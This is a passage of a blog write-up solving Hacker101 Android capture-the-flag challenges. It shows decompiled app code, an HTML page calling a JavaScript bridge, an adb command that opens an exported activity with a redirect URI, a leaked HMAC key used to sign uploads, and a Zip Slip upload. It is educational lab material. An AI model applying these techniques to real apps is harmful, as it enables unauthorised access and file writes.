                <span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">6</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">str</span> <span class="o">=</span> <span class="n">str</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">int</span> <span class="n">i5</span> <span class="o">=</span> <span class="n">i3</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
                <span class="kt">int</span> <span class="n">i6</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
                <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">i6</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">iArr</span><span class="o">[</span><span class="n">i5</span><span class="o">]</span> <span class="o">==</span> <span class="mi">5</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i5</span><span class="o">]</span> <span class="o">==</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">i6</span><span class="o">++;</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i5</span><span class="o">]</span> <span class="o">==</span> <span class="mi">5</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">i6</span><span class="o">--;</span>
                    <span class="o">}</span>
                    <span class="n">i5</span><span class="o">++;</span>
                <span class="o">}</span>
                <span class="n">i3</span> <span class="o">=</span> <span class="n">i5</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i3</span><span class="o">]</span> <span class="o">==</span> <span class="mi">5</span> <span class="o">&amp;&amp;</span> <span class="n">bArr</span><span class="o">[</span><span class="n">i4</span><span class="o">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">int</span> <span class="n">i7</span> <span class="o">=</span> <span class="n">i3</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span>
                <span class="kt">int</span> <span class="n">i8</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
                <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">i8</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">iArr</span><span class="o">[</span><span class="n">i7</span><span class="o">]</span> <span class="o">==</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i7</span><span class="o">]</span> <span class="o">==</span> <span class="mi">5</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">i8</span><span class="o">++;</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">iArr</span><span class="o">[</span><span class="n">i7</span><span class="o">]</span> <span class="o">==</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">i8</span><span class="o">--;</span>
                    <span class="o">}</span>
                    <span class="n">i7</span><span class="o">--;</span>
                <span class="o">}</span>
                <span class="n">i3</span> <span class="o">=</span> <span class="n">i7</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="n">i3</span><span class="o">++;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">str</span> <span class="o">+</span> <span class="s">".html"</span><span class="o">;</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>the code below this appears to perform a variety of operations that result in a path to a html file being created which should contains the flag. To call this method, I can create a simple web server an host the following html file to execute the <code class="language-plaintext highlighter-rouge">getFlagPath()</code> method.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"flag"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;script&gt;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">iface</span><span class="p">.</span><span class="nf">getFlagPath</span><span class="p">()</span>
        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Then leveraging the second activity which as we said above isn’t protected and doesn’t contain the <code class="language-plaintext highlighter-rouge">exported=false</code> flag which could allow us to access it directly. we will access it via the host final and the scheme <code class="language-plaintext highlighter-rouge">oauth://</code> and adding the <code class="language-plaintext highlighter-rouge">uri</code> parameter for redirection. Using the following command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>adb shell am start <span class="nt">-W</span> <span class="nt">-a</span> android.intent.action.VIEW <span class="nt">-d</span> <span class="s2">"oauth://final/?uri=EXPLOIT-LINK"</span> com.hacker101.oauth
</pre></table></code></div></div><p>And we will get the path for the second flag: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2Fp4jD8YCxNhqK0yvcfXye%2Fimage.png?alt=media&amp;token=50ee68aa-96be-4b13-8360-6ec6c5341563" alt="" /> then access http://35.227.24.107/307f6c07e3/PATH.htmlto get the flag. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FbDhPcKKL1g5O3xnycdk7%2Fimage.png?alt=media&amp;token=305e0bf8-b835-41ad-99ee-42066f6b7596" alt="" /> Anther simple way to get the path of the flag is by running the <code class="language-plaintext highlighter-rouge">getFlagPath()</code> method in any online java compiler and you will get the path. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FbgneQFTOnoRF7vbDPtu5%2Fimage.png?alt=media&amp;token=ed623530-124f-4a40-a54e-b8afba397451" alt="" /></p><h2 id="webdev">Webdev</h2><p>Getting everything ready for testing and start browsing the application. first the APK start with following page: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FCWRnM2NnBaX7olCJY9jK%2Fwebdev-1.png?alt=media&amp;token=68d70d42-f3ba-473a-9ff2-6fca5d141828" alt="" /></p><p>If we click on Edit we will have the ability to edit an index.html file: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FXhBYLTengcS35FeS6oDS%2Fimage.png?alt=media&amp;token=3a1be9d2-14ca-4238-9d39-725f8a4a37ff" alt="" /></p><p>I tried to put XSS code in the html file but nothing happens. at this point I didn’t know what I should do and what is the idea of the challenge. So I decided to enumerate more by looking at burp traffic I found this request: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FjL5eIoNr9ANC4IIbIYD4%2Fimage.png?alt=media&amp;token=d189806b-954f-4a05-b5f8-471d8a759eb5" alt="" /></p><p>So there is a file upload functionality under upload.php: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2Fl0dx7lK9zDCTZhEeUvUw%2Fwebdev-upload.png?alt=media&amp;token=1d755710-546c-4860-8a76-1949b88aa63b" alt="" /></p><p>It only accepts zip file so I uploaded one but an error occurred <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FgECWKoy8e6t9NWje9u2f%2Fwebdev-HMAC.png?alt=media&amp;token=be280895-0554-44d5-b9dc-711a04b1003e" alt="" /></p><p>Hmm! let’s examine the source code to see what is happening. in AndroidManifest.xml:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.hacker101.webdev.MainActivity"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;intent-filter&gt;</span>
            <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span>
</pre></table></code></div></div><p>there is only one activity. So let’s at its source code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="kd">implements</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span> <span class="o">{</span>
    <span class="nc">Button</span> <span class="n">editButton</span><span class="o">;</span>
    <span class="nc">Button</span> <span class="n">refreshButton</span><span class="o">;</span>
    <span class="nc">WebView</span> <span class="n">webView</span><span class="o">;</span>
    <span class="nc">Boolean</span> <span class="n">editing</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="kd">protected</span> <span class="nc">String</span> <span class="nc">HmacKey</span> <span class="o">=</span> <span class="s">"8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d"</span><span class="o">;</span>

    <span class="cm">/* loaded from: classes.dex */</span>
    <span class="kd">private</span> <span class="kd">class</span> <span class="nc">SSLTolerantWebViewClient</span> <span class="kd">extends</span> <span class="nc">WebViewClient</span> <span class="o">{</span>
        <span class="nc">WebView</span> <span class="n">webView</span><span class="o">;</span>

        <span class="nc">SSLTolerantWebViewClient</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">webView</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">webView</span> <span class="o">=</span> <span class="n">webView</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="nd">@Override</span> <span class="c1">// android.webkit.WebViewClient</span>
        <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">shouldOverrideUrlLoading</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">webView</span><span class="o">,</span> <span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">str</span><span class="o">);</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="nd">@Override</span> <span class="c1">// android.webkit.WebViewClient</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceivedSslError</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">webView</span><span class="o">,</span> <span class="nc">SslErrorHandler</span> <span class="n">sslErrorHandler</span><span class="o">,</span> <span class="nc">SslError</span> <span class="n">sslError</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">.</span><span class="na">onReceivedSslError</span><span class="o">(</span><span class="n">webView</span><span class="o">,</span> <span class="n">sslErrorHandler</span><span class="o">,</span> <span class="n">sslError</span><span class="o">);</span>
            <span class="n">sslErrorHandler</span><span class="o">.</span><span class="na">proceed</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="nc">String</span> <span class="nf">Hmac</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="o">(</span><span class="s">"TODO: Implement this and expose to JS"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="cm">/* JADX INFO: Access modifiers changed from: protected */</span>
    <span class="nd">@Override</span> <span class="c1">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
    <span class="nd">@RequiresApi</span><span class="o">(</span><span class="n">api</span> <span class="o">=</span> <span class="mi">19</span><span class="o">)</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">editButton</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">edit</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">editButton</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">refreshButton</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">refresh</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">refreshButton</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WebView</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webview</span><span class="o">);</span>
        <span class="nc">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">;</span>
        <span class="n">webView</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">SSLTolerantWebViewClient</span><span class="o">(</span><span class="n">webView</span><span class="o">));</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"http://35.227.24.107/407fb9155e/content/"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span> <span class="c1">// android.view.View.OnClickListener</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">view</span><span class="o">.</span><span class="na">getId</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">id</span> <span class="o">!=</span> <span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">edit</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">id</span> <span class="o">==</span> <span class="no">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">refresh</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">reload</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">editing</span><span class="o">.</span><span class="na">booleanValue</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">editButton</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">"Edit"</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"http://35.227.24.107/407fb9155e/content/"</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">editing</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">editButton</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">"View"</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"http://35.227.24.107/407fb9155e/edit.php"</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">editing</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>at line 6 we can see that there is a HMAC key and the rest of the code is routing of the application and also note at line 46 the use of <code class="language-plaintext highlighter-rouge">setJavaScriptEnabled</code> which indicate that if open this app in browser our code XSS code will run normally due to the use of JavaScript.</p><p>As we saw earlier while trying to upload the file we get “HMAC missing” after some research I found that the uploaded file has to be signed with HMAC key to be validated. So I signed a random file in <a href="https://gchq.github.io/CyberChef">cyberchef</a> and upload it. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2F0GngH6MXztQjdjgJrdbV%2Fwebdev-cyberchef.png?alt=media&amp;token=83f363af-df08-4a53-802a-dfa68db38d47" alt="" /></p><p>Copying the value and add it in our file upload functionality. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FL2evv7BE3u9tRta85oIB%2Fwebdev-flag1.png?alt=media&amp;token=4decb629-3605-4bf2-801c-f4104dae8dee" alt="" /> Great we got the first flag!</p><p>So what else can be exploited? Since this file upload functionality only accepts .zip I think this a hint for a vulnerability called <a href="https://github.com/snyk/zip-slip-vulnerability">ZIP Slip Attack</a>:</p><blockquote><p>Zip Slip is a widespread critical archive extraction vulnerability, allowing attackers to write arbitrary files on the system, typically resulting in remote command execution. It was discovered and responsibly disclosed by the Snyk Security team ahead of a public disclosure on 5th June 2018, and affects thousands of projects, including ones from HP, Amazon, Apache, Pivotal and many more. This page provides the most up-to-date fix statuses for the libraries and projects that were found to be exploitable or contain a vulnerable implementation.</p></blockquote><p>So let’s pick any POC for the vulnerability from the internet and then signed again with HMAC id and upload it: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzhnspC86QpTMcEsuZLGz%2Fuploads%2FH6PYWxfgvK26GlX0nWlG%2Fwebdev-flag2.png?alt=media&amp;token=314e3e7b-9964-4af1-bdfd-2dadd12abdde" alt="" /> Voila!! it worked!</p><h2 id="references">References</h2><ul><li><a href="https://infosecwriteups.com/hacker101-ctf-android-challenge-writeups-f830a382c3ce">https://infosecwriteups.com/hacker101-ctf-android-challenge-writeups-f830a382c3ce</a><li><a href="https://pymotw.com/2/hmac/">https://pymotw.com/2/hmac/</a><li><a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a><li><a href="https://www.tutorialspoint.com/compile_java_online.php">https://www.tutorialspoint.com/compile_java_online.php</a><li><a href="https://hackerone.com/reports/328486">https://hackerone.com/reports/328486</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackerone-ctf/'>Hackerone CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android-security/" class="post-tag no-text-decoration" >android security</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackerone Android Challenges Writeups - Muhammad Adel&url=https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackerone Android Challenges Writeups - Muhammad Adel&u=https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackerone Android Challenges Writeups - Muhammad Adel&url=https://itsfading.github.io/posts/Hackerone-Android-challenges-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Insecureshop-Android-Vulnerable-Application-Writeup/"><div class="card-body"> <span class="timeago small" > Sep 6, 2024 <i class="unloaded">2024-09-06T17:40:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Walkthrough of The InsecureShop Android Vulnerable Application</h3><div class="text-muted small"><p> Introduction InsecureShop is an Android application that is designed to be intentionally vulnerable. The application serves as a platform to test your Android pentesting skills. The vulnerabilitie...</p></div></div></a></div><div class="card"> <a href="/posts/HexTree-Attack-Surface-App-Solutions/"><div class="card-body"> <span class="timeago small" > Nov 6, 2024 <i class="unloaded">2024-11-06T13:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HexTree Attack Surface Android App Solutions</h3><div class="text-muted small"><p> Introduction Peace be upon all of you. In this post I am going to share all the solutions for the Attack Surface Android app, which is part of the amazing Hextree Android Application Security cour...</p></div></div></a></div><div class="card"> <a href="/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/"><div class="card-body"> <span class="timeago small" > Aug 29, 2021 <i class="unloaded">2021-08-29T19:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover</h3><div class="text-muted small"><p> Introduction Peace be upon you all, this is actually my first writeup which is going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program, which ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/" class="btn btn-outline-primary" prompt="Older"><p>Unrestricted File Upload Leads to SSRF and RCE</p></a> <a href="/posts/ASCWGs-Qualifications-2022-Writeup/" class="btn btn-outline-primary" prompt="Newer"><p>ASCWGs Qualifications 2022 CTF Web Challenges Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a 